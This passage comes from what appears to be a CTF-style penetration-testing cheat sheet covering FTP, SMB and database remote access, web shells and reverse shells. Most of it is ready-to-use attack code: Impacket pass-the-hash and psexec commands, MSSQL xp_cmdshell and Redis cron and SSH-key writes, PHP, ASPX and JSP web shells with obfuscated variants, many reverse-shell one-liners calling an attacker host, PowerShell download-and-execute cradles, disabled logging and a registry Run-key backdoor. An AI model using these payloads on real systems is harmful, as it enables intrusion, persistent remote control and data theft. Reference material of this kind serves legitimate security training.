Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process -Force

# Disable ScriptBlock logging
New-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0 -Force
```

### PowerShell Remoting from Non-Windows Systems

From Kali Linux, use Python-based WinRM libraries or reimplemented WinRM protocols. Direct PowerShell Remoting from Linux requires either a Windows subsystem or wrapper scripts. Alternative approach using Impacket:

```bash
# Execute PowerShell command via WMI
wmiexec.py '<domain>/<username>:<password>@<target>' 'powershell.exe -Command "Get-Process"'
```

## FTP/SFTP Access

### FTP Protocol and Vulnerability Landscape

File Transfer Protocol (FTP) operates on port 21 and transmits credentials and data in cleartext, making it inherently insecure. Within CTF environments, FTP typically indicates intentional exposure as a privilege escalation or lateral movement vector. FTP supports anonymous login by default on misconfigured servers, enabling unauthenticated access.

### FTP Connection and Authentication

Connect to FTP service using `ftp` command-line client:

```bash
ftp <target>
# At prompt, enter username and password
# Or via command line:
ftp -n <target> << EOF
user <username>
pass <password>
ls
quit
EOF
```

Using Lftp for scripted FTP operations:

```bash
lftp -u <username>,<password> ftp://<target>
```

Scripted operations:

```bash
lftp -u <username>,<password> ftp://<target> << EOF
ls -la
cd /path
get filename
put localfile
quit
EOF
```

### Anonymous FTP Access

Test anonymous login capability:

```bash
ftp <target>
# Login: anonymous
# Password: (press enter or use fake email)
```

Using `curl` for anonymous FTP enumeration:

```bash
curl -l ftp://<target>/
curl -l ftp://<target>/path/to/directory/
```

### FTP Enumeration and File Discovery

List directory contents with detailed information:

```bash
ftp> ls -la
```

Recursively download entire FTP directory structure:

```bash
ftp> prompt off  # Disable prompting for each file
ftp> mget *      # Download all files
```

Using Lftp for recursive downloads:

```bash
lftp> mirror -R /remote/path /local/path
```

### SFTP Protocol and Secure File Transfer

SSH File Transfer Protocol (SFTP) operates over SSH (port 22), providing encrypted file transfer. SFTP is more secure than FTP as it encrypts both credentials and data.

### SFTP Connection and Authentication

Connect to SFTP server with username and password:

```bash
sftp <username>@<target>
# Enter password when prompted
```

Using private key authentication:

```bash
sftp -i /path/to/private/key <username>@<target>
```

Specific port specification:

```bash
sftp -P <port> <username>@<target>
```

### SFTP Enumeration and File Operations

List remote directory:

```bash
sftp> ls -la
sftp> pwd       # Print working directory
sftp> cd /path  # Change directory
```

Download files from remote:

```bash
sftp> get remotefile /local/destination
sftp> get -r remote_directory /local/destination  # Recursive download
```

Upload files to remote:

```bash
sftp> put /local/file /remote/destination
sftp> put -r /local/directory /remote/destination  # Recursive upload
```

### Automated FTP/SFTP Exploitation via Python

Using `paramiko` library for SFTP over SSH:

```bash
pip install paramiko
```

Python script for SFTP file enumeration and download:

```python
import paramiko

hostname = '<target>'
username = '<username>'
password = '<password>'
port = 22

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname, port, username, password)

sftp = ssh.open_sftp()
files = sftp.listdir_attr('/')

for attr in files:
    print(f'{attr.filename} - {attr.st_size} bytes')
    if attr.filename == 'target_file.txt':
        sftp.get(attr.filename, '/local/target_file.txt')

sftp.close()
ssh.close()
```

Using `ftplib` for FTP operations:

```python
from ftplib import FTP

ftp = FTP('<target>')
ftp.login('<username>', '<password>')

# List directory
ftp.retrlines('LIST', print)

# Download file
with open('local_file.txt', 'wb') as f:
    ftp.retrbinary('RETR remote_file.txt', f.write)

ftp.quit()
```

### SFTP Key-Based Authentication

Generate SSH key pair for authentication (if not already present):

```bash
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa
```

Add public key to target's authorized_keys:

```bash
# Assuming you have access to target
ssh <username>@<target>
mkdir -p ~/.ssh
echo '<public_key_content>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Connect using private key:

```bash
sftp -i ~/.ssh/id_rsa <username>@<target>
```

### Nmap FTP/SFTP Service Detection

Identify FTP service:

```bash
nmap -sV -p 21 <target>
nmap -sV -p 21 --script ftp-anon <target>  # Test anonymous access
```

Identify SSH/SFTP service:

```bash
nmap -sV -p 22 <target>
nmap -sV -p 22 --script ssh-auth-methods <target>  # Enumerate auth methods
```

## SMB Access

### SMB Protocol Overview

Server Message Block (SMB) operates on ports 139 (NetBIOS over TCP) and 445 (Direct TCP). SMB serves as the foundation for file sharing, printer sharing, and named pipes communication on Windows networks. Multiple SMB versions exist: SMBv1 (legacy, deprecated), SMBv2, and SMBv3. Within CTF contexts, SMB access with valid credentials enables file enumeration, lateral movement, and privilege escalation.

### SMB Service Detection and Enumeration

Identify SMB service version:

```bash
nmap -sV -p 139,445 <target>
nmap -sV -p 139,445 --script smb-os-discovery <target>
nmap -sV -p 139,445 --script smb-enum-shares <target>
nmap -sV -p 139,445 --script smb-enum-users <target>
```

Using `smbclient` for SMB enumeration:

```bash
# List shares without authentication
smbclient -L //<target> -N

# List shares with credentials
smbclient -L //<target> -U <username>%<password>
```

Using `enum4linux` for comprehensive SMB enumeration:

```bash
enum4linux -a <target>
enum4linux -u <username> -p <password> <target>
```

### SMB Share Enumeration and Exploitation

Connect to specific SMB share:

```bash
smbclient //<target>/<share> -U <username>%<password>
smbclient //<target>/<share> -U <domain>/<username>%<password>
```

Common SMB shares include ADMIN$, C$, IPC$, and user-defined shares. ADMIN$, C$, and other administrative shares require elevated privileges.

Within the smbclient interactive shell:

```bash
smb> ls           # List directory contents
smb> cd /path     # Change directory
smb> get file     # Download file
smb> put file     # Upload file
smb> pwd          # Print working directory
smb> quit         # Exit smbclient
```

### Null Session and Guest Access

Null sessions allow unauthenticated access to certain SMB shares and IPC communications. Test null session capability:

```bash
smbclient -L //<target> -U "" -N
# Or
smbclient //<target>/IPC$ -U "" -N
```

Guest account access (if enabled):

```bash
smbclient -L //<target> -U guest%
```

### SMB Share Discovery and Enumeration via Nmap

Identify available shares:

```bash
nmap -sV -p 445 --script smb-enum-shares.nse <target>
nmap -sV -p 445 --script smb-enum-shares.nse --script-args smbusername=<username>,smbpassword=<password> <target>
```

Enumerate users on SMB system:

```bash
nmap -sV -p 445 --script smb-enum-users.nse <target>
nmap -sV -p 445 --script smb-enum-users.nse --script-args smbusername=<username>,smbpassword=<password> <target>
```

Enumerate groups:

```bash
nmap -sV -p 445 --script smb-enum-groups.nse --script-args smbusername=<username>,smbpassword=<password> <target>
```

### SMB Exploitation with Impacket

Impacket provides multiple SMB-based exploitation tools. Key utilities include `smbexec`, `psexec`, and `atexec`.

#### smbexec

Execute commands on target via SMB service exploitation:

```bash
smbexec.py '<domain>/<username>:<password>@<target>'
smbexec.py -hashes :<ntlm_hash> '<domain>/<username>@<target>'
```

Specify alternative command shell:

```bash
smbexec.py -shell-type powershell '<domain>/<username>:<password>@<target>'
```

#### psexec

PsExec-style exploitation via SMB (creates service on target):

```bash
psexec.py '<domain>/<username>:<password>@<target>'
psexec.py -hashes :<ntlm_hash> '<domain>/<username>@<target>'
```

Execute specific command:

```bash
psexec.py -c '/path/to/executable' '<domain>/<username>:<password>@<target>'
```

#### atexec

Execute commands via Task Scheduler (requires administrative access):

```bash
atexec.py '<domain>/<username>:<password>@<target>' 'whoami'
```

### SMB Mount and Local File Access

Mount SMB shares to local filesystem:

```bash
# Create mount point
sudo mkdir -p /mnt/smb_share

# Mount share
sudo mount -t cifs //<target>/<share> /mnt/smb_share -o username=<username>,password=<password>

# Access files
ls -la /mnt/smb_share
```

Unmount share:

```bash
sudo umount /mnt/smb_share
```

### Named Pipes and IPC$ Share Exploitation

Named pipes over SMB enable remote procedure calls and service communication. Enumerate named pipes:

```bash
# Via smb connection
smbclient //<target>/IPC$ -U <username>%<password>
smb> ls
```

Using Impacket's `samrdump` to query domain information via IPC$:

```bash
samrdump.py '<domain>/<username>:<password>@<target>'
```

### NTLM Relay and Credential Forwarding

[Unverified] NTLM relay attacks capture NTLM authentication responses and forward them to secondary targets, enabling lateral movement without cracking credentials. However, this technique depends on specific network configurations and SMB signing policies that may not be present in all CTF environments. Verify relay viability through reconnaissance.

Using `ntlmrelayx` to relay SMB credentials:

```bash
# Capture and relay NTLM authentication to secondary target
ntlmrelayx.py -t smb://<secondary_target> -c '<command>'
```

This requires positioning the relay tool between the victim and target, typically via MITM or DNS hijacking.

### Credential Caching and Persistence

Store credentials for repeated SMB access:

```bash
# Create/edit ~/.smbcredentials file
echo "username=<username>" > ~/.smbcredentials
echo "password=<password>" >> ~/.smbcredentials
chmod 600 ~/.smbcredentials

# Use credentials file in mount
sudo mount -t cifs //<target>/<share> /mnt/smb_share -o credentials=~/.smbcredentials
```

### Pass-the-Hash (PTH) via SMB

Exploit cached NTLM hashes to access SMB shares without plaintext passwords:

```bash
smbclient //<target>/<share> -U <username> --pw-nt-hash <ntlm_hash>
smbexec.py -hashes :<ntlm_hash> '<domain>/<username>@<target>'
psexec.py -hashes :<ntlm_hash> '<domain>/<username>@<target>'
```

### Python SMB Exploitation Framework

Using `impacket.smbconnection` for custom SMB exploitation:

```bash
pip install impacket
```

Basic SMB connection and file enumeration:

```python
from impacket.smbconnection import SMBConnection

conn = SMBConnection('<target>', '<target>', sess_setup_on_connect=False)
conn.login('<username>', '<password>')

# List shares
shares = conn.listShares()
for share in shares:
    print(share['shi1_netname'][:-1])  # Remove trailing null byte

# Enumerate files in share
share_name = 'C$'
files = conn.listPath(share_name, '\\')
for f in files:
    print(f.get_longname())

conn.logoff()
```

Retrieve file via SMB:

```python
with open('/local/destination', 'wb') as f:
    conn.getFile(share_name, '\\path\\to\\file.txt', f.write)
```

### SMB Signature and Encryption Detection

Identify SMB security configurations:

```bash
nmap -sV -p 445 --script smb-security-mode.nse <target>
```

[Inference] If SMB signing is disabled and encryption is not enforced, man-in-the-middle attacks and relay attacks become viable. However, modern Windows systems typically enable signing by default; CTF scenarios may intentionally disable these protections to enable exploitation.

### Lateral Movement via SMB

Use obtained credentials to pivot to additional systems:

```bash
# Enumerate network shares accessible with current credentials
smbclient -L //<new_target> -U <username>%<password>

# Connect and explore
smbclient //<new_target>/<share> -U <username>%<password>
```

### SMB Nmap Vulnerability Scanning

Scan for known SMB vulnerabilities (e.g., EternalBlue, MS17-010):

```bash
nmap -sV -p 445 --script smb-vuln-ms17-010.nse <target>
nmap -sV -p 445 --script smb-vuln-*.nse <target>  # Test all SMB vulnerabilities
```

These scripts require target to be running vulnerable SMB versions (typically SMBv1).

---

### Cross-Topic Considerations

**Credential Verification**: Before launching exploitation, verify credential validity through low-impact reconnaissance. Testing against IPC$ share or WinRM endpoint validation requires minimal interaction and reveals authentication success.

**Logging and Detection**: All remote access methods generate logs on target systems. Event ID 4624 (successful logon), 4625 (failed logon), and 4634 (logoff) appear in Windows Event Log for all remote access types. PowerShell logging (Event ID 4103/4104) records command execution within PowerShell Remoting and WinRM sessions. SMB access logs appear in File Server Resource Manager and SMB audit logs.

**Network Segmentation**: Network policies may restrict inter-system communication. Test reachability before exploitation using `ping`, `traceroute`, or port scanning. Some CTF environments intentionally block certain protocols to require alternative approaches.

**Related Exploitation Topics**: Privilege escalation post-initial access, credential harvesting and dumping, domain controller exploitation, and lateral movement via trusted relationships extend the scope of remote access exploitation beyond initial entry.

---

## Database Remote Access

### MySQL/MariaDB Remote Access

**Connection Methods**

```bash
# Direct connection with credentials
mysql -h <target_ip> -u <username> -p<password>
mysql -h <target_ip> -u <username> -p  # Prompts for password

# Specify database
mysql -h <target_ip> -u <username> -p<password> -D <database_name>

# Non-interactive execution
mysql -h <target_ip> -u <username> -p<password> -e "SELECT * FROM users;"

# Batch mode from file
mysql -h <target_ip> -u <username> -p<password> < commands.sql
```

**Port and Socket Specifications**

```bash
# Non-standard port
mysql -h <target_ip> -P 3307 -u <username> -p

# Unix socket (local access)
mysql -S /var/run/mysqld/mysqld.sock -u <username> -p
```

**Post-Connection Enumeration**

```sql
-- Version and user information
SELECT version();
SELECT user();
SELECT current_user();
SELECT system_user();

-- Database enumeration
SHOW DATABASES;
USE <database_name>;
SHOW TABLES;
DESCRIBE <table_name>;

-- Privilege enumeration
SHOW GRANTS;
SHOW GRANTS FOR 'username'@'host';
SELECT * FROM mysql.user WHERE User='username'\G

-- File privileges check
SELECT file_priv FROM mysql.user WHERE user='username';
```

**File System Operations** [Inference: Requires FILE privilege]

```sql
-- Read files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\win.ini');

-- Write files (web shell deployment)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';

-- Check secure_file_priv restrictions
SHOW VARIABLES LIKE 'secure_file_priv';
```

**User-Defined Functions (UDF) Exploitation** [Inference: Requires specific privileges]

```sql
-- Create UDF for command execution
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('nc -e /bin/sh <attacker_ip> <port>');
```

### PostgreSQL Remote Access

**Connection Methods**

```bash
# psql client
psql -h <target_ip> -p 5432 -U <username> -d <database>
psql postgresql://<username>:<password>@<target_ip>:5432/<database>

# Non-interactive
psql -h <target_ip> -U <username> -d <database> -c "SELECT version();"

# From file
psql -h <target_ip> -U <username> -d <database> -f commands.sql
```

**Post-Connection Enumeration**

```sql
-- Version and user information
SELECT version();
SELECT current_user;
SELECT session_user;

-- Database enumeration
\l                          -- List databases
\c <database_name>          -- Connect to database
\dt                         -- List tables
\d <table_name>             -- Describe table

-- Privilege enumeration
\du                         -- List users and roles
SELECT * FROM pg_user;
SELECT * FROM pg_roles;
```

**Command Execution Techniques** [Inference: Requires superuser or specific privileges]

sql

```sql
-- Via COPY FROM PROGRAM (PostgreSQL 9.3+)
CREATE TABLE cmd_output(data text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- Via large objects
SELECT lo_import('/etc/passwd', 12345);
SELECT lo_get(12345);

-- Via CVE-2019-9193 (authenticated command execution)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh <attacker_ip> <port>';
```

### MSSQL Remote Access

**Connection Methods**

bash

```bash
# impacket-mssqlclient
impacket-mssqlclient <username>:<password>@<target_ip>
impacket-mssqlclient <domain>/<username>:<password>@<target_ip> -windows-auth

# sqsh (Linux)
sqsh -S <target_ip> -U <username> -P <password>

# sqlcmd (if available)
sqlcmd -S <target_ip> -U <username> -P <password>
```

**Post-Connection Enumeration**

sql

```sql
-- Version and user information
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT SUSER_NAME();

-- Database enumeration
SELECT name FROM sys.databases;
USE <database_name>;
SELECT * FROM information_schema.tables;

-- Privilege checks
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('public');
EXEC sp_helpsrvrolemember;
```

**Command Execution via xp_cmdshell** [Inference: Requires sysadmin or specific privileges]

sql

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\"http://<attacker_ip>/shell.ps1\")"';

-- Multi-line output handling
CREATE TABLE ##temp (output varchar(8000));
INSERT INTO ##temp EXEC xp_cmdshell 'dir C:\';
SELECT * FROM ##temp;
DROP TABLE ##temp;
```

**Alternative Execution Methods**

sql

```sql
-- Via sp_OACreate (if xp_cmdshell disabled)
DECLARE @output INT;
EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami';

-- Via xp_regwrite (registry modification for persistence)
EXEC xp_regwrite 'HKEY_LOCAL_MACHINE','Software\Microsoft\Windows\CurrentVersion\Run','backdoor','REG_SZ','C:\backdoor.exe';
```

### MongoDB Remote Access

**Connection Methods**

bash

```bash
# mongo client
mongo <target_ip>:27017
mongo <target_ip>:27017/<database> -u <username> -p <password>

# Authentication database
mongo <target_ip>:27017/admin -u <username> -p <password> --authenticationDatabase admin

# MongoDB URI format
mongo "mongodb://<username>:<password>@<target_ip>:27017/<database>"
```

**Post-Connection Enumeration**

javascript

```javascript
// Version and user information
db.version()
db.runCommand({connectionStatus: 1})

// Database enumeration
show dbs
use <database_name>
show collections
db.<collection>.find()
db.<collection>.find().pretty()

// User enumeration
db.getUsers()
db.system.users.find()
```

**NoSQL Injection via Authenticated Access** [Inference: Depends on application implementation]

javascript

```javascript
// Extracting data
db.<collection>.find({$where: "this.password.length > 0"})

// JavaScript execution (if enabled)
db.eval("return 'test'")
```

### Redis Remote Access

**Connection Methods**

bash

```bash
# redis-cli
redis-cli -h <target_ip> -p 6379
redis-cli -h <target_ip> -p 6379 -a <password>

# With authentication
redis-cli -h <target_ip> -p 6379
AUTH <password>

# Test connection
redis-cli -h <target_ip> ping
```

**Post-Connection Enumeration**

bash

```bash
# Server information
INFO
INFO server
INFO keyspace

# Configuration
CONFIG GET *
CONFIG GET dir
CONFIG GET dbfilename

# Key enumeration
KEYS *
SCAN 0
GET <key>
```

**File Write Exploitation** [Inference: Requires write permissions to target directories]

bash

```bash
# Write SSH key
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-rsa AAAAB3NzaC... root@attacker\n\n"
SAVE

# Write web shell
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
SAVE

# Write cron job (Linux)
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET payload "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1\n\n"
SAVE
```

## Web Shell Access

### PHP Web Shells

**Basic Execution Shells**

php

```php
// Minimal command execution
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>

// With output formatting
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

// Obfuscated variants
<?php @eval($_POST['cmd']); ?>
<?php $a=$_GET['a'];$b=$_GET['b'];$a($b); ?>  // Usage: ?a=system&b=whoami
```

**File Upload Shells**

php

```php
// Simple file upload
<?php
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file" />
<input type="submit" value="Upload" />
</form>

// Advanced with directory specification
<?php
if(isset($_POST['upload'])) {
    $target = $_POST['dir'] . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
}
?>
```

**Popular Web Shell Frameworks**

bash

```bash
# b374k shell (password-protected)
# Located in Kali: /usr/share/webshells/php/b374k.php
# Default password: b374k

# c99 shell (feature-rich)
# Located in Kali: /usr/share/webshells/php/c99.php

# PHP reverse shell (pentestmonkey)
# Located in Kali: /usr/share/webshells/php/php-reverse-shell.php
cp /usr/share/webshells/php/php-reverse-shell.php .
# Edit: Set $ip and $port variables
```

**Web Shell Deployment via SQLi**

sql

```sql
-- MySQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';

-- PostgreSQL
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

### ASP/ASPX Web Shells

**Classic ASP Shells**

asp

```asp
<!-- Simple command execution -->
<%
Dim cmd
cmd = Request.QueryString("cmd")
Set objShell = Server.CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd.exe /c " & cmd)
Response.Write("<pre>")
Response.Write(objExec.StdOut.ReadAll())
Response.Write("</pre>")
%>
```

**ASP.NET Shells**

aspx

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

**Kali Resources**

bash

```bash
# ASP shells location
/usr/share/webshells/asp/

# ASPX shells location
/usr/share/webshells/aspx/
```

### JSP Web Shells

**Basic JSP Shell**

jsp

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(in));
String line;
while((line = reader.readLine()) != null) {
    out.println(line + "<br>");
}
%>
```

**Kali Resources**

bash

```bash
# JSP shells location
/usr/share/webshells/jsp/
```

### Web Shell Interaction Tools

**cURL Command Execution**

bash

```bash
# Basic command execution
curl "http://<target>/shell.php?cmd=whoami"

# URL-encoded commands
curl "http://<target>/shell.php?cmd=cat%20/etc/passwd"

# POST request
curl -X POST -d "cmd=whoami" "http://<target>/shell.php"

# With authentication
curl -u username:password "http://<target>/shell.php?cmd=id"
curl -H "Authorization: Bearer <token>" "http://<target>/shell.php?cmd=id"
```

**Interactive Shell via Script**

bash

```bash
#!/bin/bash
# webshell-interact.sh
URL="http://<target>/shell.php"
while true; do
    read -p "shell> " cmd
    curl -s "${URL}?cmd=${cmd}" | grep -oP '(?<=<pre>).*(?=</pre>)'
done
```

### Web Shell Obfuscation Techniques

**PHP Obfuscation**

php

```php
// Base64 encoding
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>  // system($_GET['cmd']);

// Variable function calls
<?php $f='system'; $f($_GET['c']); ?>

// Concatenation
<?php $a='sys'.'tem'; $a($_GET['c']); ?>

// Character codes
<?php $a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $a($_GET['c']); ?>
```

## Reverse Shell Techniques

### Bash Reverse Shells (Linux)

**Standard TCP Reverse Shell**

bash

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1

# Alternative syntax
0<&196;exec 196<>/dev/tcp/<attacker_ip>/<port>; sh <&196 >&196 2>&196

# Using bash -c
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'

# URL-encoded for web exploitation
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker_ip>%2F<port>%200%3E%261%27
```

**Netcat Reverse Shells**

bash

```bash
# Traditional netcat (with -e flag)
nc -e /bin/sh <attacker_ip> <port>
nc -e /bin/bash <attacker_ip> <port>

# Without -e flag (mkfifo method)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f

# OpenBSD netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker_ip> <port> > /tmp/f

# Ncat (nmap's netcat)
ncat <attacker_ip> <port> -e /bin/bash
ncat --ssl <attacker_ip> <port> -e /bin/bash  # Encrypted
```

**Python Reverse Shells**

bash

```bash
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python with pty (better shell)
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

**Perl Reverse Shells**

bash

```bash
# Perl one-liner
perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows Perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<attacker_ip>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

**PHP Reverse Shells**

bash

```bash
# PHP command line
php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP with descriptor handling
php -r '$sock=fsockopen("<attacker_ip>",<port>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

**Ruby Reverse Shells**

bash

```bash
# Ruby one-liner
ruby -rsocket -e'f=TCPSocket.open("<attacker_ip>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby with explicit I/O
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

**Java Reverse Shells**

bash

```bash
# Java runtime execution
java -version  # Check if Java available
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### PowerShell Reverse Shells (Windows)

**Basic PowerShell Reverse Shell**

powershell

```powershell
# One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Encoded PowerShell (bypass execution policy)
$command = 'IEX(New-Object Net.WebClient).DownloadString("http://<attacker_ip>/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

**Nishang Reverse Shells** [Unverified: Requires Nishang framework]

powershell

```powershell
# Download Nishang (if not in Kali)
git clone https://github.com/samratashok/nishang.git

# Invoke-PowerShellTcp
powershell "IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <attacker_ip> -Port <port>"

# Invoke-PowerShellTcpOneLine
powershell IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-PowerShellTcpOneLine.ps1')
```

**PowerCat Reverse Shell** [Unverified: Requires PowerCat]

powershell

```powershell
# Download and execute PowerCat
powershell "IEX(New-Object System.Net.Webclient).DownloadString('http://<attacker_ip>/powercat.ps1');powercat -c <attacker_ip> -p <port> -e cmd"

# PowerCat with encoded payload
powercat -c <attacker_ip> -p <port> -e cmd -ge
# Copy the generated payload and execute on target
```

### Windows CMD Reverse Shells

**Netcat for Windows**

cmd

```cmd
# Traditional execution
nc.exe <attacker_ip> <port> -e cmd.exe

# Transfer nc.exe to target
certutil -urlcache -f http://<attacker_ip>/nc.exe nc.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<attacker_ip>/nc.exe','nc.exe')"
```

**Native Windows Techniques**

cmd

```cmd
# Using mshta (HTML Application)
mshta http://<attacker_ip>/shell.hta

# Using rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/shell.ps1')")
```

### Listener Setup (Attacker Machine)

**Netcat Listeners**

bash

```bash
# Basic listener
nc -lvnp <port>

# Verbose output with timing
nc -lvnp <port> -v

# Save session to file
nc -lvnp <port> | tee session.log

# Multiple connection handling (loop)
while true; do nc -lvnp <port>; done
```

**Metasploit Multi-Handler**

bash

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp  # Or appropriate payload
set LHOST <attacker_ip>
set LPORT <port>
exploit -j  # Run as job
```

**Socat Listeners** [Inference: More flexible than netcat]

bash

```bash
# Basic listener
socat TCP-LISTEN:<port> STDOUT

# Encrypted listener (SSL/TLS)
# Generate certificate first
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# Start encrypted listener
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 STDOUT
```

### Shell Stabilization Techniques

**TTY Shell Spawning**

bash

```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Script command
/usr/bin/script -qc /bin/bash /dev/null

# Expect
expect -c 'spawn /bin/bash; interact'

# Perl
perl -e 'exec "/bin/bash";'

# Ruby
ruby -e 'exec "/bin/bash"'

# Lua
lua -e 'os.execute("/bin/bash")'
```

**Fully Interactive TTY** [Inference: Requires specific terminal configuration]

bash

```bash
# Step 1: Spawn PTY
python -c 'import pty; pty.spawn("/bin/bash")'

